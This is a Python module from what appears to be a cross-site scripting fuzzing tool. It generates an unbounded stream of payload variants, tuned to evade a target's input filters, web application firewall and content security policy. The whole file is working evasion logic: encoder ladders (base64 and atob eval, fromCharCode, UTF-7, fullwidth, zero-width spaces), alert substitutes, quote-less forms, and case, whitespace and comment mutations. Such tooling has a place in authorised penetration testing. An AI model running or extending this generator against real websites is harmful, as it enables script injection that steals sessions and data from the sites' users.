"""Lazy, filter-aware bypass payload generator.

Given a seed payload and a filter profile from xf_filter, yield an effectively
unbounded stream of candidate variants (encoders, bypass techniques, mutations,
chained transformations, whitespace/case/comment tricks). Variants that avoid
raw blocked tokens are yielded first.
"""
import itertools
import re

import payloads as P
import xf_filter
import xf_mutate
import xf_waf

_TOKEN = dict(xf_filter.PROBES)

# Tokens that matter for payload construction (ignore word list here; keyword
# blocks are handled by the encoder ladder).
_BLOCK_KEYS = ("angle-open", "angle-close", "slash", "single-quote",
               "double-quote", "paren-open", "paren-close", "equal",
               "space", "tab", "comment-open")


def _blocked_tokens(profile):
    bad = set()
    for key in _BLOCK_KEYS:
        if key in profile.get("blocked", []) or key in profile.get("removed", []):
            tok = _TOKEN.get(key)
            if tok:
                bad.add(tok)
    return bad


def _safe(variant, blocked):
    """True if the variant avoids raw blocked structural tokens."""
    if not blocked:
        return True
    return not any(t in variant for t in blocked if t not in (" ", "\t"))


def _case_variants(s):
    out = {s, s.swapcase()}
    out.add(re.sub(r"<([a-zA-Z]+)", lambda m: "<" + "".join(
        c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group(1))), s))
    return out


def _space_variants(s):
    out = set()
    for ws in ("\t", "\n", "\r", "\f", "/**/", "&#09;"):
        out.add(s.replace(" ", ws))
    return out


def generate(seed, profile=None, context="html", limit=0, encoders=None,
             facts=None, attack=None):
    """Yield unique payload variants, safest first. limit=0 means unlimited.

    ``facts`` is the passive web-probe result and ``attack`` the inferred attack
    type; both bias the generated payloads toward what the target can actually
    execute (WAF evasion, quote-less canaries, DOM/ challenge win vectors).
    """
    profile = profile or {}
    blocked = _blocked_tokens(profile)
    ctx = (context or "html").lower()
    pref_names = list(encoders or [])
    facts = facts or {}
    # Analysis-driven encoder priority.
    blocked_names = set(profile.get("blocked") or []) | set(profile.get("removed") or [])
    escaped_names = set(profile.get("escaped") or {})
    if "word-alert" in blocked_names or "word-alert" in escaped_names:
        pref_names = ["alt-prompt", "alt-confirm", "alt-console", "alt-print",
                      "call-concat", "call-atob", "call-constructor",
                      "noquote-regex"] + pref_names
    if "single-quote" in (blocked_names | escaped_names):
        pref_names = ["noquote-regex", "noquote-ident", "js-unicode",
                      "fromcharcode", "call-template"] + pref_names
    if {"angle-open", "tag-script"} & (blocked_names | escaped_names):
        pref_names = ["html-dec", "html-hex", "url", "url2"] + pref_names
    if facts.get("waf"):
        pref_names = xf_waf.suggest_encoders(facts["waf"]) + [
            "html-mixed", "comment", "zwsp", "fullwidth", "utf7"] + pref_names
    if facts.get("csp"):
        pref_names = ["b64doc", "fromcharcode", "b64-eval", "atob-eval"] + pref_names
    if (facts.get("challenge") or attack == "challenge") and "alert(1)" not in seed:
        seed = '"+alert(1)+"'
    if attack == "dom" or (facts.get("dom_sinks") and ctx == "dom"):
        pref_names = ["url", "html-dec", "noquote-regex"] + pref_names
    # de-duplicate preference order
    seen_pref = set()
    pref_names = [e for e in pref_names
                  if not (e in seen_pref or seen_pref.add(e))]
    pref = [P.ENCODERS[e] for e in pref_names if e in P.ENCODERS]
    enc_list = pref + [fn for name, fn in P.ENCODERS.items() if name not in pref_names]
    seen = {seed}
    priority_q, safe_q, other_q = [], [], []
    n = 0
    yielded = 0

    def add(v, priority=False):
        nonlocal n
        if not v or v in seen or len(v) > 600:
            return
        seen.add(v)
        n += 1
        if priority:
            priority_q.append(v)
        else:
            (safe_q if _safe(v, blocked) else other_q).append(v)

    # 1. direct mutations / bypasses / encoders
    if seed != "__M__":
        add(seed)
    for name, v in xf_mutate.mutate(seed, ctx, 24):
        add(v)
    for _name, v in P.bypass_variants(seed, ctx, 0):
        add(v)
    for fn in enc_list:
        try:
            add(fn(seed), priority=fn in pref)
        except Exception:
            pass

    # 2. case / whitespace / comment tricks
    for base in list(safe_q[:12]) + list(other_q[:8]):
        for v in _case_variants(base):
            add(v)
        for v in _space_variants(base):
            add(v)

    # 3. chained: encoder over the strongest bypass/mutation bases
    bases = (list(safe_q[:10]) + list(other_q[:5]))
    for base in bases:
        for fn in enc_list[:30]:
            try:
                add(fn(base))
            except Exception:
                pass

    # 4. emit the curated variants (safest first) before deeper expansion
    for v in priority_q + safe_q + other_q:
        yield v
        yielded += 1
        if limit and yielded >= limit:
            return

    # 5. iterative expansion over already-generated safe variants (keeps the
    # stream effectively unlimited without pre-materialising it)
    frontier = list(safe_q[:20])
    for depth in range(4):
        nxt = []
        for base in frontier:
            for fn in enc_list[:18]:
                try:
                    v = fn(base)
                except Exception:
                    continue
                if v and v not in seen and len(v) <= 600:
                    seen.add(v)
                    n += 1
                    nxt.append(v)
                    yield v
                    yielded += 1
                    if limit and yielded >= limit:
                        return
        frontier = nxt[:15]
        if not frontier:
            break
